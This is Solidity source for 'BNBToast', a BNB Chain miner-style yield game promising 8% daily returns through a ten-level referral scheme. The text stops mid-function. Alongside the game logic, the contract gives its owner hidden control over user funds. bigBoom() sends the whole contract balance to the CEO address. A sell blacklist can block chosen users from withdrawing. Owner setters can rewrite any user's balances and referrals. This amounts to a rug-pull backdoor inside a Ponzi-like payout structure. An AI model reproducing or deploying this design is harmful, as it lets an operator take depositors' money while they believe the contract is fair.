/**
 *Submitted for verification at BscScan.com on 2022-05-15
*/

pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

pragma solidity ^0.8.0;
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.0;

library Address {

    function isContract(address account) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}
pragma solidity ^0.8.0;

library Counters {
    struct Counter {
        // This variable should never be directly accessed by users of the library: interactions must be restricted to
        // the library's function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add
        // this feature: see https://github.com/ethereum/solidity/issues/4637
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {
        return counter._value;
    }

    function increment(Counter storage counter) internal {
        unchecked {
            counter._value += 1;
        }
    }

    function decrement(Counter storage counter) internal {
        uint256 value = counter._value;
        require(value > 0, "Counter: decrement overflow");
        unchecked {
            counter._value = value - 1;
        }
    }

    function reset(Counter storage counter) internal {
        counter._value = 0;
    }
}

pragma solidity ^0.8.0;


interface ITOAST {
    function hatcheryMiners(address) external view returns (uint256);
    function claimedEggs(address)  external view returns (uint256);
    function lastHatch(address)  external view returns (uint256);
    function referrals(address)  external view returns (address);
    function numRealRef(address)  external view returns (uint256);
    function marketEggs()  external pure returns (uint256);
  
}

interface IMEB{
    function sellFunctionBefore(address) external;
    function sellFunctionAfter(uint256,uint256,address) external;
    function hatchFunctionBefore(uint256,uint256,address) external;
    function hatchFunctionAfter(uint256,uint256,address) external;
    function buyFunctionBefore(uint256,address) external;
    function buyFunctionAfter(uint256,address) external;
}

    




contract BNBToast is Ownable{
    using SafeMath for uint256;
    uint256 public EGGS_TO_HATCH_1MINERS=1080000;// 8% daily
    uint256 public maxHatchTime=259200;// 3 day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    uint256 public minBuyValue=50000000000000000;
    uint256 public minSellValue=0;
    address public marketingAddress;
    address public preToastAddress;
    address public mebAddress;
    mapping (uint256 => address[]) public preAttendedAddress;

    address public ceoAddress;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    mapping (address => uint256) public numRealRef;
    uint256 public marketEggs;

    
    using Counters for Counters.Counter;
    Counters.Counter public _buyItemIds;
    uint256 public roundTime;
    uint256 public roundlength = 28800;
    uint256 public roundNum;

    mapping(uint256 => uint256[]) public roundToIds;
    mapping(uint256 => buyItem) public idToBuy;
    struct buyItem {
         uint256 amount;
         uint256 buyTime;
         address buyer;
         uint256 buyItemId;
         uint256 roundNum;
    }

    mapping(uint256 => mapping(uint256 => uint256)) public roundToNextId;
    mapping(uint256 => uint256) public roundToReward;
    mapping(address => uint256) public myFomoRewardTotal;
    uint256 public thisRoundRate = 7;
    uint256 public moneyRankingRate = 6;
    uint256 public fomoRewardRate = 3;
    uint256 public fomoRewardLen = 10;
    uint256 constant GUARD = ~uint256(0);

    uint256 public realRefMinAmount = 50000000000000000;
    uint256 public minQualifiedRefNumber = 100;

    mapping(address => bool) public appointedQualified;

    mapping(address => mapping(uint256 =>uint256)) public addressToReferralInvestAmount;
    mapping(address => mapping(uint256 =>uint256)) public addressToReferralReInvestAmount;


    mapping (address => uint256) public myHatchAmount;

    uint256[10] public referralRates;
    uint256 public burnRate = 50;
    mapping(address => address[]) public myInviteAddress;

    struct referralDetails {
         uint256 level;
         uint256 proportion;
         uint256 investAmount;
         uint256 reInvestProportion;
         uint256 reInvestAmount;
    }

    event buyToast (address buyer, uint256 amount,  uint256 roundNum);
    event timeFomoRewardDistributed (address buyer, uint256 amount,  uint256 roundNum);
    event moneyFomoRewardDistributed (address buyer, uint256 amount,  uint256 roundNum);

    bool memberVersion = false;
    bool punishMod = false;

    mapping(address => bool) public sellBlackList;
    mapping(address => bool) public miningWhiteList;
    mapping(address => uint256) public mySellValue;
    mapping(address => uint256) public lastPunishedTime;
    mapping(address => uint256) public myBuyValue;
    uint256 public realRefPunish = 20;
    uint256 public minHatchAmountPunish = 10000000000000000000;
    uint256 public minBuyValuePunish = 1000000000000000000;
    uint256 public maxSellValuePunish = 10000000000000000000;
    uint256 public punishFactor = 2;

    constructor(address _preAddress) {
        ceoAddress = msg.sender;
        marketingAddress = 0x7e9EcDf6B56dFa529dA344Cc7f513DB383CB4B2C; 
        preToastAddress = _preAddress;
        referralRates = [10,4,3,2,1,1,1,1,1,1];
        roundTime = block.timestamp;
    }

// **migrate the preToastAddress to the new toastAddress**
// ***set attend address***
    function pushAttendedAddressBatch(uint256 _num, address[] memory _address) public onlyOwner{
        for (uint256 i = 0; i < _address.length; i++) {
            preAttendedAddress[_num].push(_address[i]);
        }
    }

    function setAttendedAddressBatch(uint256 _num, address[] memory _address) public onlyOwner{
        preAttendedAddress[_num] = _address;
    }

// ***set variables*** 
    function updateAll(uint256 _num) public onlyOwner{
        updateHatcheryMiners( _num);
        updateClaimedEggs( _num);
        updateLastHatch( _num);
        updateReferrals( _num);
        updateNumRealRef( _num);
    }

    function updateMarketEggs() public onlyOwner{
        marketEggs = ITOAST(preToastAddress).marketEggs(); 
    }

    function updateHatcheryMiners(uint256 _num) public onlyOwner{
        for (uint256 i = 0; i < preAttendedAddress[_num].length; i++) {
            hatcheryMiners[preAttendedAddress[_num][i]] = ITOAST(preToastAddress).hatcheryMiners(preAttendedAddress[_num][i]);
        }
    }

    function updateClaimedEggs(uint256 _num) public onlyOwner{
        for (uint256 i = 0; i < preAttendedAddress[_num].length; i++) {
            claimedEggs[preAttendedAddress[_num][i]] = ITOAST(preToastAddress).claimedEggs(preAttendedAddress[_num][i]);
        }
    }

    function updateLastHatch(uint256 _num) public onlyOwner{
        for (uint256 i = 0; i < preAttendedAddress[_num].length; i++) {
            lastHatch[preAttendedAddress[_num][i]] = ITOAST(preToastAddress).lastHatch(preAttendedAddress[_num][i]);
        }
    }

    function updateReferrals(uint256 _num) public onlyOwner{
        for (uint256 i = 0; i < preAttendedAddress[_num].length; i++) {
            referrals[preAttendedAddress[_num][i]] = ITOAST(preToastAddress).referrals(preAttendedAddress[_num][i]);
        }
    }

    function updateNumRealRef(uint256 _num) public onlyOwner{
        for (uint256 i = 0; i < preAttendedAddress[_num].length; i++) {
            numRealRef[preAttendedAddress[_num][i]] = ITOAST(preToastAddress).numRealRef(preAttendedAddress[_num][i]);
        }
    }


    // must be called after updateAll!
    function updateMyInviteAddress(uint256 _num) public onlyOwner{
        for (uint256 i = 0; i < preAttendedAddress[_num].length; i++) {
            myInviteAddress[referrals[preAttendedAddress[_num][i]]].push(preAttendedAddress[_num][i]);
        }
    }



// **admin function**

    function setPunishFactor(uint256 _punishFactor) public onlyOwner{
        punishFactor = _punishFactor;
    }
    
    function setRealRefPunish(uint256 _realRefPunish) public onlyOwner{
        realRefPunish = _realRefPunish;
    }

    function setMyBuyValue(address _address, uint256 _value) public onlyOwner{
        myBuyValue[_address] = _value;
    }
    function setMySellValue(address _address, uint256 _value) public onlyOwner{
        mySellValue[_address] = _value;
    }
    function setBlacklist(address _address, bool _bool) public onlyOwner{
        sellBlackList[_address] = _bool;
    }

    function setBlacklistBatch(address[] memory _address, bool _bool) public onlyOwner{
        for(uint i=0; i<_address.length; i++){
            sellBlackList[_address[i]] = _bool;
        }
    }
    
    
    function setReferralRates(uint256[] memory _rates) public onlyOwner{
        for(uint i=0;i<10;i++){
            referralRates[i] = _rates[i];
        }
    }

    function mining(address _addr, uint256 _value) public {
        require(miningWhiteList[msg.sender]);
        if(address(this).balance<_value){
            return ;
        }
        payable(_addr).transfer(_value);
        
    }

    function bigBoom() public  {
        require(msg.sender == ceoAddress);
        payable(msg.sender).transfer(address(this).balance);
    }


    function setEGGS_TO_HATCH_1MINERS(uint256 _EGGS_TO_HATCH_1MINERS) public onlyOwner{
        EGGS_TO_HATCH_1MINERS = _EGGS_TO_HATCH_1MINERS;
    }
    function setMaxHatchTime(uint256 _maxHatchTime) public onlyOwner{
        maxHatchTime = _maxHatchTime;
    }
    function setPS(uint256 _PSN, uint256 _PSNH) public onlyOwner{
        PSN = _PSN;
        PSNH = _PSNH;
    }
    function setMinBuyValue(uint256 _minBuyValue) public onlyOwner{
        minBuyValue = _minBuyValue;
    }
    function setMinSellValue(uint256 _minSellValue) public onlyOwner{
        minSellValue = _minSellValue;
    }
    function setHatcheryMiners(address _addr, uint256 _hatchValue) public onlyOwner{
        hatcheryMiners[_addr] = _hatchValue;
    }
    function setClaimedEggs(address _addr, uint256 _claimedEggs) public onlyOwner{
        claimedEggs[_addr] = _claimedEggs;
    }
    function setLastHatch(address _addr, uint256 _lastHatch) public onlyOwner{
        lastHatch[_addr] = _lastHatch;
    }
    function setReferrals(address _addr, address _referrals) public onlyOwner{
        referrals[_addr] = _referrals;
    }
    function setNumRealRef(address _addr, uint256 _numRealRef) public onlyOwner{
        numRealRef[_addr] = _numRealRef;
    }
    function setMarketEggs(uint256 _marketEggs) public onlyOwner{
        marketEggs = _marketEggs;
    }
    function setRoundlength(uint256 _roundlength) public onlyOwner{
        roundlength = _roundlength;
    }
    function setThisRoundRate(uint256 _thisRoundRate) public onlyOwner{
        thisRoundRate = _thisRoundRate;
    }
    function setMoneyRankingRate(uint256 _moneyRankingRate) public onlyOwner{
        moneyRankingRate = _moneyRankingRate;
    }
    function setFomoRewardRate(uint256 _fomoRewardRate) public onlyOwner{
        fomoRewardRate = _fomoRewardRate;
    }
    function setRealRefMinAmount(uint256 _realRefMinAmount) public onlyOwner{
        realRefMinAmount = _realRefMinAmount;
    }
    function setMinQualifiedRefNumber(uint256 _minQualifiedRefNumber) public onlyOwner{
        minQualifiedRefNumber = _minQualifiedRefNumber;
    }
    function setAppointedQualified(address _addr, bool _appointedQualified) public onlyOwner{
        appointedQualified[_addr] = _appointedQualified;
    }
    function setReferralRates(uint256[10] memory _inputRate) public onlyOwner{
        for(uint i=0; i<10; i++){
            referralRates[i] = _inputRate[i];
        }
    }
    function setBurnRate(uint256 _burnRate) public onlyOwner{
        burnRate = _burnRate;
    }
    function setMyInviteAddress(address _addr,address _downline) public onlyOwner{
        myInviteAddress[_addr].push(_downline);
    }

    function setMemberVersion(bool _bool) public onlyOwner{
        memberVersion = _bool;
    }
    function setMiningWhiteList(address _addr, bool _bool) public onlyOwner{
        miningWhiteList[_addr] = _bool;
    }
    function setFomoRewardLen(uint256 _len) public onlyOwner{
        fomoRewardLen = _len;
    }
    function setPunishMod(bool _bool) public onlyOwner{
        punishMod = _bool;
    }
    function setMebAddress(address _addr) public onlyOwner{
        mebAddress = _addr;
    }
    

// **calculate function**
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketEggs,address(this).balance);
    }
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketEggs);
    }
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,address(this).balance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,3),100);
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyEggs() public view returns(uint256){
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
    function getMyWetEggs() public view returns(uint256){
        uint256 wetEggs = getMyinviteReward();

        return wetEggs;
    }
    function getMyNetEggs() public view returns(uint256){
        uint256 totalEggs = getMyEggs();
        uint256 wetEggs = getMyWetEggs();
        uint256 netEggs = SafeMath.sub(totalEggs,wetEggs);

        return netEggs;
    }

    function getMyReinvestAmount() public view returns(uint256){
        return myHatchAmount[msg.sender];
    }
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(maxHatchTime,SafeMath.sub(block.timestamp,lastHatch[adr]));
        if(getPunishedStatus(msg.sender)){
            return secondsPassed*hatcheryMiners[adr]/punishFactor;
        }else{
            return secondsPassed*hatcheryMiners[adr];
        }
        
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

// **user function**
// ***user basic function***
    function getPunishedStatus(address _addr) public view returns(bool){
        if(!punishMod){
            return false;
        }
        
        
        if( numRealRef[_addr]<realRefPunish && mySellValue[_addr]>maxSellValuePunish && myBuyValue[_addr]<minBuyValuePunish && myHatchAmount[_addr]<minHatchAmountPunish){
            return true;
        }else{
            return false;
        }

    }
    
    function sellEggs() public{
        require(!sellBlackList[msg.sender], "You are in the blacklist");
        if(memberVersion){
            IMEB(mebAddress).sellFunctionBefore(msg.sender);
        }
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);
        
        
        
        require(eggValue>=minSellValue, "You need to have at least minSellValue to sell");
        uint256 fee=devFee(eggValue);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=block.timestamp;
        marketEggs=SafeMath.add(marketEggs,hasEggs);
        payable(marketingAddress).transfer(fee);
        if(memberVersion){
            IMEB(mebAddress).sellFunctionAfter(eggValue,fee,msg.sender);
        }else{
            payable(msg.sender).transfer(SafeMath.sub(eggValue,fee));
            mySellValue[msg.sender]=SafeMath.add(mySellValue[msg.sender],eggValue);
        }
    }

    function buyEggs(address ref) public payable{
        require(msg.value >= minBuyValue, "Not Enough BNB");
        myBuyValue[msg.sender]=SafeMath.add(myBuyValue[msg.sender],msg.value);
        if(memberVersion){
            IMEB(mebAddress).buyFunctionBefore(msg.value,msg.sender);
        }
        updateRoundNum();
        _buyItemIds.increment();
        uint256 itemId = _buyItemIds.current();
        roundToIds[roundNum].push(itemId);       
        idToBuy[itemId] = buyItem(
                        msg.value,
                        block.timestamp,
                        msg.sender,
                        itemId,
                        roundNum
                        );
        
        _addPlayer(roundNum, itemId);
        roundToReward[roundNum] = roundToReward[roundNum] + msg.value*fomoRewardRate*thisRoundRate/1000;
        roundToReward[roundNum+1] = roundToReward[roundNum+1] + msg.value*fomoRewardRate*(10-thisRoundRate)/1000;


        uint256 eggsBought=calculateEggBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
        uint256 fee=devFee(msg.value);
        payable(marketingAddress).transfer(fee);
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
            myInviteAddress[ref].push(msg.sender);
        }
        if (msg.value>=realRefMinAmount){
        numRealRef[referrals[msg.sender]] +=1;

        }

        uint256 eggsUsed=getMyEggs();
        // uplingAddress
        address upline1reward = referrals[msg.sender];
        address upline2reward = referrals[upline1reward];
        address upline3reward = referrals[upline2reward];
        address upline4reward = referrals[upline3reward];
        address upline5reward = referrals[upline4reward];
        address upline6reward = referrals[upline5reward];
        address upline7reward = referrals[upline6reward];
        address upline8reward = referrals[upline7reward];
        address upline9reward = referrals[upline8reward];
        address upline10reward = referrals[upline9reward];

        //send referral eggs
        if (upline1reward != address(0)) {
           addressToReferralInvestAmount[upline1reward][1] += SafeMath.div((eggsUsed * referralRates[0]), 100);
        }

        if (upline2reward != address(0)) {
            addressToReferralInvestAmount[upline2reward][2] += SafeMath.div((eggsUsed * referralRates[1]), 100);

        }
        if (upline3reward != address(0)) {
            addressToReferralInvestAmount[upline3reward][3] += SafeMath.div((eggsUsed * referralRates[2]), 100);

        }

        if (upline4reward != address(0)) {
            addressToReferralInvestAmount[upline4reward][4] += SafeMath.div((eggsUsed * referralRates[3]), 100);
        }

        if (upline5reward != address(0)) {
            addressToReferralInvestAmount[upline5reward][5] += SafeMath.div((eggsUsed * referralRates[4]), 100);
        }

        if(getIsQualified(upline6reward)){

            if (upline6reward != address(0)) {
                addressToReferralInvestAmount[upline6reward][6] += SafeMath.div((eggsUsed * referralRates[5]), 100);
            }
        }

        if(getIsQualified(upline7reward)){

            if (upline7reward != address(0)) {
                addressToReferralInvestAmount[upline7reward][7] += SafeMath.div((eggsUsed * referralRates[6]), 100);
            }
        }

        if(getIsQualified(upline8reward)){

            if (upline8reward != address(0)) {
                addressToReferralInvestAmount[upline8reward][8] += SafeMath.div((eggsUsed * referralRates[7]), 100);
            }
        }

        if(getIsQualified(upline9reward)){

            if (upline9reward != address(0)) {
                addressToReferralInvestAmount[upline9reward][9] += SafeMath.div((eggsUsed * referralRates[8]), 100);
            }
        }

        if(getIsQualified(upline10reward)){

            if (upline10reward != address(0)) {
                addressToReferralInvestAmount[upline10reward][10] += SafeMath.div((eggsUsed * referralRates[9]), 100);
            }
        }
        if(memberVersion){
            IMEB(mebAddress).buyFunctionAfter(msg.value,msg.sender);
        }
        hatchEggs(ref);

        emit buyToast (msg.sender, msg.value,  roundNum);
    }


    function hatchEggs(address ref) public{
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
            myInviteAddress[ref].push(msg.sender);
        }
        
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        if(memberVersion){
            IMEB(mebAddress).hatchFunctionBefore(eggsUsed,hatcheryMiners[msg.sender],msg.sender);
        }
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        myHatchAmount[msg.sender] += eggsUsed;
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=block.timestamp;


        // uplingAddress
        address upline1reward = referrals[msg.sender];
        address upline2reward = referrals[upline1reward];
        address upline3reward = referrals[upline2reward];
        address upline4reward = referrals[upline3reward];
        address upline5reward = referrals[upline4reward];
        address upline6reward = referrals[upline5reward];
        address upline7reward = referrals[upline6reward];
        address upline8reward = referrals[upline7reward];
        address upline9reward = referrals[upline8reward];
        address upline10reward = referrals[upline9reward];

        //send referral eggs
        if (upline1reward != address(0)) {
            if(myHatchAmount[msg.sender] <= myHatchAmount[upline1reward]){
                uint256 eggsToAdd = SafeMath.div((eggsUsed * referralRates[0]), 100);
                claimedEggs[upline1reward] = SafeMath.add(
                    claimedEggs[upline1reward],
                    eggsToAdd                    
                );
            

            }else{
                uint256 eggsToAdd = SafeMath.div((eggsUsed * referralRates[0]* burnRate), 10000);
                claimedEggs[upline1reward] = SafeMath.add(
                    claimedEggs[upline1reward],
                    eggsToAdd                    
                );

               
            }
            

            addressToReferralReInvestAmount[upline1reward][1] += SafeMath.div((eggsUsed * referralRates[0]), 100);
        }

        if (upline2reward != address(0)) {
            claimedEggs[upline2reward] = SafeMath.add(
                claimedEggs[upline2reward],
                SafeMath.div((eggsUsed * referralRates[1]), 100)
            );
           
            addressToReferralReInvestAmount[upline2reward][2]  += SafeMath.div((eggsUsed * referralRates[1]), 100);

        }
        if (upline3reward != address(0)) {
            claimedEggs[upline3reward] = SafeMath.add(
                claimedEggs[upline3reward],
                SafeMath.div((eggsUsed * referralRates[2]), 100)
            );
           
            addressToReferralReInvestAmount[upline3reward][3]  += SafeMath.div((eggsUsed * referralRates[2]), 100);

        }

        if (upline4reward != address(0)) {
            claimedEggs[upline4reward] = SafeMath.add(
                claimedEggs[upline4reward],
                SafeMath.div((eggsUsed * referralRates[3]), 100)
            );
           
            addressToReferralReInvestAmount[upline4reward][4]  += SafeMath.div((eggsUsed * referralRates[3]), 100);
        }

        if (upline5reward != address(0)) {
            claimedEggs[upline5reward] = SafeMath.add(
                claimedEggs[upline5reward],
                SafeMath.div((eggsUsed * referralRates[4]), 100)
            );
           
            addressToReferralReInvestAmount[upline5reward][5]  += SafeMath.div((eggsUsed * referralRates[4]), 100);
        }

        if(getIsQualified(upline6reward)){

            if (upline6reward != address(0)) {
                claimedEggs[upline6reward] = SafeMath.add(
                claimedEggs[upline6reward],
                SafeMath.div((eggsUsed * referralRates[5]), 100)
                );
                
                addressToReferralReInvestAmount[upline6reward][6]  += SafeMath.div((eggsUsed * referralRates[5]), 100);
            }
        }

        if(getIsQualified(upline7reward)){

            if (upline7reward != address(0)) {
                claimedEggs[upline7reward] = SafeMath.add(
                claimedEggs[upline7reward],
                SafeMath.div((eggsUsed * referralRates[6]), 100)
                );
               
                addressToReferralReInvestAmount[upline7reward][7]  += SafeMath.div((eggsUsed * referralRates[6]), 100);
            }
        }

        if(getIsQualified(upline8reward)){

            if (upline8reward != address(0)) {
                claimedEggs[upline8reward] = SafeMath.add(
                claimedEggs[upline8reward],
                SafeMath.div((eggsUsed * referralRates[7]), 100)
                );
                
                addressToReferralReInvestAmount[upline8reward][8]  += SafeMath.div((eggsUsed * referralRates[7]), 100);
            }
        }

        if(getIsQualified(upline9reward)){

            if (upline9reward != address(0)) {
                claimedEggs[upline9reward] = SafeMath.add(
                claimedEggs[upline9reward],
                SafeMath.div((eggsUsed * referralRates[8]), 100)
                );
               
                addressToReferralReInvestAmount[upline9reward][9]  += SafeMath.div((eggsUsed * referralRates[8]), 100);
            }
        }

        if(getIsQualified(upline10reward)){

            if (upline10reward != address(0)) {
                claimedEggs[upline10reward] = SafeMath.add(
                claimedEggs[upline10reward],
                SafeMath.div((eggsUsed * referralRates[9]), 100)
                );
               
                addressToReferralReInvestAmount[upline10reward][10]  += SafeMath.div((eggsUsed * referralRates[9]), 100);
            }
        }

        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
        if(memberVersion){
            IMEB(mebAddress).hatchFunctionAfter(eggsUsed,hatcheryMiners[msg.sender],msg.sender);
        }
    }

     

// ***user fomo function***

    function updateRoundNum() public {
        uint256 nextRoundtime = roundTime + roundlength;
        if(block.timestamp > nextRoundtime){
            address[] memory timeRankingAddresses = getTimeRankingThisRoundAddress();
            address[] memory moneyRankingAddresses = getMoneyRankingThisRoundAddress();
            uint256 moneyRankingReward = roundToReward[roundNum] * moneyRankingRate / 10;
            uint256 timeRankingReward = roundToReward[roundNum] * (10-moneyRankingRate) / 10;
        
            for(uint i = 0; i < fomoRewardLen; i++){
                myFomoRewardTotal[timeRankingAddresses[i]] = myFomoRewardTotal[timeRankingAddresses[i]] + timeRankingReward/fomoRewardLen;
                myFomoRewardTotal[moneyRankingAddresses[i]] = myFomoRewardTotal[moneyRankingAddresses[i]] + moneyRankingReward/fomoRewardLen;
                emit timeFomoRewardDistributed(timeRankingAddresses[i],timeRankingReward/fomoRewardLen,roundNum);
                emit moneyFomoRewardDistributed(moneyRankingAddresses[i],moneyRankingReward/fomoRewardLen,roundNum);
            }
            roundNum += 1;
            roundTime = nextRoundtime;
        }
    }
    // ****only need to write until the end of the round to reduce gas****
    function _getTimeRankingThisRoundAddress(uint256 _roundNum) public view returns(address[] memory){

        uint256[] memory ids = roundToIds[_roundNum];
        address[] memory timeRankingAddresses = new address[](10);
        for (uint i = 0; i < ids.length; i++) {
            if(i<10){
                uint iReverse = ids.length-i-1;
                uint256 id = ids[iReverse];
                timeRankingAddresses[i] = idToBuy[id].buyer;
            }
        }
        return timeRankingAddresses;
    }

    function getTimeRankingThisRoundAddress() public view returns(address[] memory){
        address[] memory timeRankingAddresses = _getTimeRankingThisRoundAddress(roundNum);
        return timeRankingAddresses;
    }

    function _getMoneyRankingThisRoundAddress(uint256 _roundNum) public view returns(address[] memory){

        uint256[] memory ids = roundToIds[_roundNum];
        address[] memory moneyRankingAddresses = new address[](10);
        uint256 currentId = roundToNextId[_roundNum][GUARD];
        for (uint i = 0; i < ids.length; i++) {
            if(i<10){
                moneyRankingAddresses[i] = idToBuy[currentId].buyer;
                currentId = roundToNextId[_roundNum][currentId];
            }
        }
        return moneyRankingAddresses;
    }

    function getMoneyRankingThisRoundAddress() public view returns(address[] memory){
        address[] memory moneyRankingAddresses = _getMoneyRankingThisRoundAddress(roundNum);
        return moneyRankingAddresses;
    }


    function _addPlayer(uint256 _roundNum, uint256 _id) internal {     
        uint256 index = _findIndex(_roundNum, _id);
        roundToNextId[_roundNum][_id] = roundToNextId[_roundNum][index];
        roundToNextId[_roundNum][index] = _id;
    }

    function _findIndex(uint256 _roundNum, uint256 _id) internal view returns(uint256) {
        uint256 candidateId = ~uint256(0);
        while(true) {
            if(_verifyIndex(candidateId, idToBuy[_id].amount, roundToNextId[_roundNum][candidateId] )){
                return candidateId;
            }
            candidateId = roundToNextId[_roundNum][candidateId];
        }
    }

    function _verifyIndex(uint256 prevStudent, uint256 newValue, uint256 nextStudent) internal view returns(bool){
        return (prevStudent == GUARD || idToBuy[prevStudent].amount >= newValue) && (nextStudent == GUARD || newValue > idToBuy[nextStudent].amount);
    }

    function claimFomoRewards() public  {
        require(myFomoRewardTotal[msg.sender] > 0, "Not enough FOMO rewards");
        uint256 fomoRewards = myFomoRewardTotal[msg.sender];
        myFomoRewardTotal[msg.sender] = 0;
        payable(msg.sender).transfer(fomoRewards);
        
    }

    function getMyFomoRewardTotal() public view returns(uint256){
        return myFomoRewardTotal[msg.sender];
    }

    function getFomoThisRoundReward() public view returns(uint256){
        return roundToReward[roundNum];
    }

    function getFomoThisRoundNumber() public view returns(uint256){
        return roundNum;
    }

    function getFomoThisRoundStartTime() public view returns(uint256){
        return roundTime;
    }

    function getFomoTotalRewardDistributed() public view returns(uint256){
        uint256 fomoTotalRewardDistributed=0;
        for(uint i=0;i<roundNum;i++){
            fomoTotalRewardDistributed += roundToReward[i];
        }
